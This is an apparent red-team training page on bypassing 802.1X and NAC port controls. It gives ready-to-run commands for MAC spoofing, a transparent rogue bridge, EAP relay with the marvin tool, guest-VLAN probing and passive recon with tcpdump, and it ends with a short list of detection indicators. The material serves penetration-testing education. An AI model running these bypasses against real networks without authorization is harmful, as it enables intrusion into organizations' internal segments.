---
layout: training-page
title: "NAC / 802.1X Bypass — Red Team Academy"
module: "Network Attacks"
tags:
  - nac
  - 802.1x
  - network-access-control
  - mac-spoofing
  - eap
  - network
page_key: "network-nac-bypass"
render_with_liquid: false
---

# NAC / 802.1X Bypass

Network Access Control (NAC) systems use 802.1X port authentication, MAC address filtering, or endpoint posture checking to restrict which devices can access network segments. These controls are frequently misconfigured and bypassable through MAC cloning, bridge attacks, or EAP relay.

## 802.1X Overview

```
Components:
  Supplicant  — the device requesting access (workstation)
  Authenticator — the switch port; enforces policy
  Auth Server — RADIUS server (FreeRADIUS, Cisco ISE, etc.)

Flow:
  Supplicant → EAPOL Start → Authenticator
  Authenticator → EAP Request/Identity → Supplicant
  Supplicant → EAP Response/Identity → Authenticator
  Authenticator → RADIUS Access-Request → RADIUS Server
  RADIUS Server → RADIUS Access-Accept/Reject → Authenticator
  Authenticator → EAP Success/Failure → Supplicant
  [If success] Port transitions to authorized state

EAP methods (common):
  EAP-TLS    — certificate-based mutual auth (strongest)
  PEAP/MSCHAPv2 — username/password wrapped in TLS (common)
  EAP-TTLS   — similar to PEAP; inner auth via PAP/MSCHAPv2
  EAP-MD5    — weak, deprecated; crackable offline
```

## Bypass 1: MAC Address Cloning

```bash
# Most common bypass — NAC allowlists printer/IoT/legacy device MACs
# If you can read the MAC from the device label or network scan,
# clone it to get port access

# Identify an already-authorized MAC (printers, IoT, VoIP phones)
# Methods:
# - Physical: read label on printer/phone
# - Network: passively sniff DHCP/ARP traffic for non-802.1X devices
# - SNMP: query switch ARP/MAC table (if SNMP is accessible)

# Spoof MAC on Linux
ip link set eth0 down
ip link set eth0 address AA:BB:CC:DD:EE:FF
ip link set eth0 up

# Or with macchanger
macchanger -m AA:BB:CC:DD:EE:FF eth0

# Connect and request DHCP
dhclient eth0

# Verify
ip addr show eth0
arp -n | grep eth0
```

## Bypass 2: 802.1X Bridge Attack (Transparent Bridge)

```bash
# Physical: plug rogue device between an authorized device and the switch
# Authorized device authenticates → port becomes authorized
# Bridge forwards all traffic including attacker's

#  Switch ── Authorized Workstation
#  Switch ── [Rogue Device (bridge)] ── Authorized Workstation

# Linux bridge setup
apt install bridge-utils

ip link set eth0 up   # interface facing switch
ip link set eth1 up   # interface facing authorized PC

brctl addbr br0
brctl addif br0 eth0
brctl addif br0 eth1
ip link set br0 up

# Configure attacker on bridge interface with different MAC
# The bridge is transparent — 802.1X auth from workstation passes through
# Your traffic also egresses through the authorized port

# Nmap the internal network through the bridge
nmap -e br0 192.168.1.0/24
```

## Bypass 3: EAP Relay (marvin attack)

```bash
# For environments using EAP-TLS or certificate-based auth:
# If you can intercept EAP frames, relay them between victim and RADIUS
# The auth completes, but your device gets the access

# marvin — 802.1X relay attack tool
# github.com/Orange-Cyberdefense/marvin

# Prerequisites:
# - Physical access between switch and a device with valid certificate
# - Two network interfaces (one facing switch, one facing victim device)

python3 marvin.py --listen eth0 --relay eth1

# Once relay succeeds, configure attacker IP on eth0
```

## Bypass 4: VLAN Misconfiguration

```bash
# Some NAC deployments put unauthenticated devices in a "guest VLAN"
# If the guest VLAN has routing to internal segments (misconfiguration),
# you can reach internal resources without authenticating

# Check what VLAN you're placed in
ip addr show  # get DHCP address range
# 192.168.100.x = guest VLAN? Try to reach internal:
ping 10.0.0.1
curl http://10.0.0.1:80

# VLAN hopping from guest VLAN to internal
# See: network-attacks/vlan-hopping
```

## Bypass 5: Post-Authentication Monitoring Gaps

```bash
# Many NAC systems only check identity at port-up time
# They don't continuously verify the authorized device is still connected

# Disconnect authorized device → reconnect rogue device quickly
# Some switches maintain the authorized state for a grace period
# Or: hot-swap cable while switch port stays authorized

# Monitor switch MAC table aging timeout:
# If timeout > 0, authorized MAC state persists briefly after disconnect
# Aggressive plug/unplug during the window can work
```

## Reconnaissance

```bash
# Identify if 802.1X is in use
# - EAPOL frames visible on wire: tcpdump 'ether proto 0x888e'
# - EAP exchange visible in Wireshark
# - Trying to connect without auth → only gets DHCP from guest VLAN or no DHCP

# Identify authorized devices for MAC cloning targets
# Passive approach: listen for DHCP, ARP, or CDP/LLDP from non-802.1X ports
tcpdump -i eth0 'udp port 67 or udp port 68'   # DHCP broadcasts
tcpdump -i eth0 'arp'                           # ARP from authorized devices
tcpdump -i eth0 'ether proto 0x2000'            # CDP (reveals device type)

# Printers and IoT devices often bypass 802.1X via MAC auth bypass (MAB)
# These are prime cloning candidates
```

## Detection

```
802.1X bypass indicators:
  - Same MAC seen on multiple ports simultaneously (bridge attack)
  - MAC address mismatch with DHCP hostname / fingerprint
  - Device type (OS fingerprint) doesn't match expected device class
  - EAPOL frames on port that should only have MAB devices
```

## Resources

- marvin (EAP relay) — `github.com/Orange-Cyberdefense/marvin`
- macchanger — `github.com/alobbs/macchanger`
- MITRE T1556 — Modify Authentication Process — `attack.mitre.org/techniques/T1556/`
- 802.1X NAC Bypass research — Russ Gyasi, DEF CON presentations
